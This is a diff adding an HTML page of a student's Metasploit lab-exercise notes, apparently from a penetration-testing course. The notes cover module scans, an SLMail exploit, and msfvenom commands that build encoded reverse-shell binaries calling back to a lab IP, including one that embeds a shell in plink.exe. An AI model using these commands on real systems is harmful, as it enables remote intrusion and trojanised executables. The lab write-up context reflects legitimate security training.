@@ -1,0 +1,95 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Exercises-16.4.3-Metasploit-STILL HAVE EXERCISES TO COMPLETE</title>
+</head><body>16.4.3 - Exercises<br/>
+1. Start the required postgresql service and launch msfconsole<br/>
+2. Use the SMB, HTTP, and any other interesting auxiliary modules to scan the lab systems.<br/>
+3. Review the host information in the database. Try to fill it with as much<br/>
+information as you can.<br/>
+<br/>
+1.<br/>
+Started with commands:<br/>
+<b>systemctl start postgresql<br/>
+</b><b>msfconsole</b><br/>
+<br/>
+2.<br/>
+Used the following scanners:<br/>
+auxiliary/scanner/snmp/snmp_enum<br/>
+auxiliary/scanner/smb/smb_enumusers<br/>
+auxiliary/scanner/smb/smb_version<br/>
+auxiliary/scanner/http/http_login<br/>
+<br/>
+3.<br/>
+Reviewed host information with:<br/>
+<b>hosts<br/>
+services<br/>
+</b><b>services -p 80</b><br/>
+<br/>
+<br/>
+16.5.1 - Exercises<br/>
+1. Exploit SLMail using the existing Metasploit module.<br/>
+<span style="color: #ff0000">2. Using the SMB vulnerability data you gathered from Nmap, use Metasploit to exploit vulnerable lab systems.</span><br/>
+<br/>
+1.<br/>
+Exploited SLmail with Metasploit module:<br/>
+<b>use exploit/windows/pop3/seattlelab_pass<br/>
+</b><b>set payload windows/shell_reverse_tcp</b><br/>
+<img src="screenshot.png" /><br/>
+<br/>
+2.<br/>
+<span style="color: #ff0000">STILL NEED TO COMPLETE THIS EXERCISE</span><br/>
+<br/>
+16.6.8 - Exercises<br/>
+1. Create a staged and a non-staged Linux binary payload to use on Kali.<br/>
+2. Setup a Netcat listener and run the non-staged payload. Does it work?<br/>
+3. Setup a Netcat listener and run the staged payload. Does it work?<br/>
+4. Get a Meterpreter shell on your Windows system. Practice file transfers.<br/>
+5. Inject a payload into plink.exe. Test it on your Windows system.<br/>
+<br/>
+1.<br/>
+<b>msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f elf --platform linux -a x86 -e x86/shikata_ga_nai &gt; linux-binary-nonstaged.elf<br/>
+</b><b>msfvenom -p linux/x86/shell/reverse_tcp LHOST=127.0.0.1 LPORT=443 -f elf --platform linux -a x86 -e x86/shikata_ga_nai &gt; linux-binary-staged.elf</b><br/>
+<br/>
+2.<br/>
+I couldn't get it to spawn a shell for me on Linux--just a connection. But the shell worked with Windows:<br/>
+<b>msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.187 LPORT=443 -f exe --platform windows -a x86 -e x86/shikata_ga_nai &gt; /var/www/html/windows-binary-nonstaged.exe</b><br/>
+<br/>
+3.<br/>
+The staged shell does not work.<br/>
+msfvenom -p windows/shell/reverse_tcp LHOST=10.11.0.187 LPORT=443 -f exe --platform windows -a x86 -e x86/shikata_ga_nai &gt; /var/www/html/windows-binary-staged.exe<br/>
+<br/>
+Because it is staged, it only works with the multi/handler:<br/>
+use exploit/multi/handler<br/>
+set payload windows/shell/reverse_tcp<br/>
+exploit<br/>
+<br/>
+When the WIN7 VM executes the staged executable, it spawns a shell.<br/>
+<img src="screenshot 2.png" /><br/>
+<br/>
+<br/>
+4.<br/>
+Meterpreter shell obtained and practiced file transfers.<br/>
+<b>set payload windows/meterpreter/reverse_tcp</b><br/>
+The staged exploit was already downloaded to the machine as created by msfvenom:<br/>
+<b>msfvenom -p windows/shell/reverse_tcp LHOST=10.11.0.187 LPORT=443 -f exe --platform windows -a x86 -e x86/shikata_ga_nai &gt; /var/www/html/windows-binary-staged.exe</b><br/>
+<img src="screenshot 3.png" /><br/>
+<br/>
+<br/>
+5.<br/>
+Injected a reverse shell into plink.exe with code below and then downloaded to the WIN 7 VM via web:<br/>
+<b>root@:~/labs/msf&gt; msfvenom -p windows/shell_reverse_tcp lhost=10.11.0.187 lport=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o plink-embedded-shell.exe</b><br/>
+<img src="screenshot 4.png" /><br/>
+<br/>
+<br/>
+16.7.1 - Exercise<br/>
+1. Create a new Metasploit module for your Crossfire exploit.<br/>
+<br/>
+1.<br/>
+Used .pdf example to create a crossfire exploit in /usr/share/metasploitframework/modules/exploits/linux/misc/crossfire.rb.<br/>
+In msfconsole, <b>use exploit/linux/misc/crossfire</b>. <b>Set payload linux/x86/shell_reverse_tcp</b>. Ran in a terminal /usr/games/crossfire/bin/crossfire. <br/>
+<br/>
+<img src="screenshot 5.png" /><br/>
+<br/>
+</body></html>
